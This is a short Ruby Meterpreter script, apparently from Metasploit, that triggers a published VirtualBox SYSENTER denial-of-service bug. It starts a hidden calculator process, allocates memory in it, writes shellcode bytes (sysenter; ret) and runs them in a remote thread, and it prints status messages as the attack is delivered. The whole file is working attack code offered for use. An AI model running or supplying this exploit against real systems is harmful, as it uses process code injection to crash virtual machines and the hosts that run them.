#!/usr/bin/env ruby

# Meterpreter script for triggering the VirtualBox DoS published at:
# http://milw0rm.com/exploits/9323

# Spawn calculator
pid = client.sys.process.execute("calc.exe", nil, {'Hidden' => 'true'}).pid
print_status("Calculator PID is #{pid}")

calc = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

# Allocate some memory
mem  = calc.memory.allocate(32)

print_status("Allocated memory at address #{"0x%.8x" % mem}")

# Write the trigger shellcode
# sysenter
# ret
calc.memory.write(mem, "\x0f\x34\xc3")

print_status("VirtualBox SYSENTER Denial of Service launching...")

# Create a new thread on the shellcode pointer
calc.thread.create(mem, 0)

print_status("VirtualBox SYSENTER Denial of Service delivered.")

